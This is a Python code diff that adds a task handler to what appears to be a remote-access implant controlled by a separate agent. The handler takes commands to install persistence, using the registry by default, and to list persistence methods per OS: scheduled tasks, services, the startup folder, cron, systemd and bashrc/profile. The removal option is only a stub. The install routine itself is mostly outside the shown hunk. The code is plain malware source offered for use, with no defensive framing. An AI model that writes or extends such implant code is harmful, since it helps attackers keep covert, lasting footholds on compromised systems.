@@ -267,4 +267,74 @@ def install_persistence(method='registry'):
             'status': 'error',
             'error': str(e),
             'timestamp': datetime.now().isoformat()
+        }
+
+def handle_persistence_task(task_type, params=None):
+    """Handle persistence tasks from the agent
+    
+    Args:
+        task_type (str): Type of persistence task
+        params (dict): Optional parameters for the task
+    
+    Returns:
+        dict: Task result with status and data
+    """
+    try:
+        if task_type == 'persistence_install':
+            # Default to registry method if no method specified
+            method = params.get('method', 'registry') if params else 'registry'
+            result = install_persistence(method)
+            
+            return {
+                'status': 'success',
+                'data': result,
+                'timestamp': datetime.now().isoformat(),
+                'type': 'persistence_install'
+            }
+            
+        elif task_type == 'persistence_list':
+            # List available persistence methods
+            if platform.system() == 'Windows':
+                methods = ['registry', 'scheduled_task', 'service', 'startup_folder', 'all']
+            else:
+                methods = ['cron', 'systemd', 'bashrc', 'profile', 'all']
+                
+            return {
+                'status': 'success',
+                'data': {
+                    'available_methods': methods,
+                    'current_os': platform.system(),
+                    'description': 'Available persistence installation methods'
+                },
+                'timestamp': datetime.now().isoformat(),
+                'type': 'persistence_list'
+            }
+            
+        elif task_type == 'persistence_remove':
+            # Remove persistence (placeholder for future implementation)
+            return {
+                'status': 'success',
+                'data': {
+                    'message': 'Persistence removal not yet implemented',
+                    'note': 'Manual removal required from registry/services/scheduled tasks'
+                },
+                'timestamp': datetime.now().isoformat(),
+                'type': 'persistence_remove'
+            }
+            
+        else:
+            return {
+                'status': 'error',
+                'data': f'Unknown persistence task type: {task_type}',
+                'timestamp': datetime.now().isoformat(),
+                'type': task_type
+            }
+            
+    except Exception as e:
+        logging.error(f"Persistence task error: {str(e)}")
+        return {
+            'status': 'error',
+            'data': str(e),
+            'timestamp': datetime.now().isoformat(),
+            'type': task_type
         } 
